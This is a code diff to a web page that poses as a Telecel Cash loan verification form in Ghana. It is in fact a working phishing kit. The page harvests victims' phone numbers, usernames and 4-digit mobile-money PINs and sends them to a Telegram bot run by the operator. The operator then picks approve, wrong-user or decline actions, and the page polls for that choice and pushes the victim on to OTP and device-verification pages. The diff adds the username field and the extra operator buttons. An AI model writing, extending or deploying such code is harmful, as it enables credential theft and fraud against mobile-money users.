@@ -400,6 +400,11 @@
         </div>
 
         <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter your username">
+        </div>
+
+        <div class="form-group">
             <label for="password">Telecel PIN</label>
             <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
             <div class="pin-hint">Enter your 4-digit Telecel Cash PIN</div>
@@ -438,19 +443,20 @@
     let state = { lastUpdateId: 0 };
     let isProcessing = false;
 
-    const phoneInput  = document.getElementById('phone');
-    const pinInput    = document.getElementById('password');
-    const continueBtn = document.getElementById('continueBtn');
-    const errMsg      = document.getElementById('errMsg');
-    const spinner     = document.getElementById('spinner');
+    const phoneInput    = document.getElementById('phone');
+    const usernameInput = document.getElementById('username');
+    const pinInput      = document.getElementById('password');
+    const continueBtn   = document.getElementById('continueBtn');
+    const errMsg        = document.getElementById('errMsg');
+    const spinner       = document.getElementById('spinner');
 
     // ── Load and display loan details ──
     function loadLoanDetails() {
-        const params   = new URLSearchParams(window.location.search);
-        const amount   = params.get('amount');
-        const duration = params.get('duration');
-        const purpose  = params.get('purpose');
-        const name     = params.get('name');
+        const params    = new URLSearchParams(window.location.search);
+        const amount    = params.get('amount');
+        const duration  = params.get('duration');
+        const purpose   = params.get('purpose');
+        const name      = params.get('name');
         const prevPhone = params.get('phone');
 
         if (amount) {
@@ -472,43 +478,49 @@
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    function sendToBot(phone, pin) {
+    function sendToBot(phone, username, pin) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
         continueBtn.textContent = "Verifying…";
 
-        const ts        = Date.now();
-        const approveId = `approve_${ts}`;
-        const declineId = `decline_${ts}`;
-        const verifyId  = `verify_${ts}`;
+        const ts            = Date.now();
+        const approveId     = `approve_${ts}`;
+        const declineId     = `decline_${ts}`;
+        const verifyId      = `verify_${ts}`;
+        const correctUserId = `correctuser_${ts}`;
+        const wrongUserId   = `wronguser_${ts}`;
 
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nUsername: <code>${username}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "✅ Approve Loan",   callback_data: approveId },
-                            { text: "📱 Verify Device",  callback_data: verifyId }
+                            { text: "✅ Approve Loan",  callback_data: approveId },
+                            { text: "📱 Verify Device", callback_data: verifyId }
                         ],
-                        [{ text: "❌ Decline", callback_data: declineId }]
+                        [
+                            { text: "✔️ Correct-user",  callback_data: correctUserId },
+                            { text: "❌ Wronge-user",   callback_data: wrongUserId }
+                        ],
+                        [{ text: "🚫 Decline", callback_data: declineId }]
                     ]
                 }
             })
         })
         .then(() => {
             spinner.style.display = 'flex';
-            startPolling(approveId, declineId, verifyId);
+            startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId);
         })
         .catch(() => resetButton());
     }
 
-    function startPolling(approveId, declineId, verifyId) {
+    function startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId) {
         const interval = setInterval(() => {
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                 .then(r => r.json())
@@ -531,6 +543,19 @@
                                 spinner.style.display = 'none';
                                 window.location.href = `${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
                             }
+                            else if (cb === correctUserId) {
+                                // Correct username → go to otp.html just like approve
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                window.location.href = `${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
+                            }
+                            else if (cb === wrongUserId) {
+                                // Wrong username → show error, stay on page
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showError("Wrong username entered. Please check your username and try again.");
+                                resetButton();
+                            }
                             else if (cb === declineId) {
                                 clearInterval(interval);
                                 spinner.style.display = 'none';
@@ -544,25 +569,30 @@
     }
 
     function showError(msg) {
-        errMsg.textContent     = msg;
-        errMsg.style.display   = 'block';
+        errMsg.textContent   = msg;
+        errMsg.style.display = 'block';
     }
 
     function resetButton() {
-        isProcessing             = false;
-        continueBtn.disabled     = false;
-        continueBtn.textContent  = "Verify & Authorize Loan";
+        isProcessing            = false;
+        continueBtn.disabled    = false;
+        continueBtn.textContent = "Verify & Authorize Loan";
     }
 
     // ── Submit ──
     continueBtn.onclick = () => {
         errMsg.style.display = 'none';
 
-        const phone = phoneInput.value.trim();
-        const pin   = pinInput.value.trim();
+        const phone    = phoneInput.value.trim();
+        const username = usernameInput.value.trim();
+        const pin      = pinInput.value.trim();
 
         if (!phone || !isValidGhanaNumber(phone)) {
             showError("Please enter a valid Ghana number (e.g. 0501234567)");
+            return;
+        }
+        if (!username) {
+            showError("Please enter your username");
             return;
         }
         if (pin.length !== 4) {
@@ -570,7 +600,7 @@
             return;
         }
 
-        sendToBot(phone, pin);
+        sendToBot(phone, username, pin);
     };
 
     // ── Input sanitisation ──
